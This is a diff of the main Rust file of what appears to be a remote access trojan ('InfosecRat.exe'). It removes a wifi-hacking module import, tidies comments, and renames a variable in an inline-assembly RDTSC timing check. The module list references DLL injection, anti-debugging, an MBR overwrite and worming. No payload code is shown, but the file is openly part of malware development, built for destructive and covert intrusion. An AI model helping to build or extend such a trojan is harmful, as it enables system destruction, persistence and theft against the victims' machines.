@@ -2,7 +2,6 @@
 mod helper_fns;
 mod dllinjection;
 mod BasicCryptoAlgos;
-mod maliciousScripts;
 mod AntiDebugChecks;
 mod MayDay;
 mod Worming;
@@ -18,9 +17,6 @@ use MayDay::mbr_overwrite::mbr;
 use winapi::shared::windot11::PDOT11_PORT_STATE_NOTIFICATION;
 use std::env::args;
 use std::process::exit;
-// use BasicCryptoAlgos::aes_exec::aes_execute;
-// use BasicCryptoAlgos::xor_cipher;
-use maliciousScripts::wifi_hack::wifi_ext;
 use AntiDebugChecks::peb_traversal::check_debug;
 use std::time::{Instant,Duration};
 use std::arch::asm;
@@ -148,7 +144,6 @@ fn handle_commands(mut stream:TcpStream) -> io::Result<()>{
 
 }
 fn main(){
-    //The collect function or method gives us the collected set of any iterable struct converted to another type just like join in python
     // if cmd_args.len()<=2{
     //     eprintln!("Usage ./InfosecRat.exe <processWindowName> <dllPath>");
     //     exit(0);
@@ -158,7 +153,6 @@ fn main(){
     let mut end_time = ULARGE_INTEGER::default();
 
     unsafe{
-    //We have to calculate the time before hand and then store it inside a variable
     let start = Instant::now();
     asm!(
         "xor rcx,rcx",
@@ -179,8 +173,6 @@ fn main(){
         out("rax") end_time.LowPart,
     );
     let duration = start.elapsed();
-    let rdtsc_duratin = end_time.quad_part() - start_time.quad_part();
-    //the quad part converts the time into a representable form
-
+    let rdtsc_duration = end_time.quad_part() - start_time.quad_part();
     }
 }
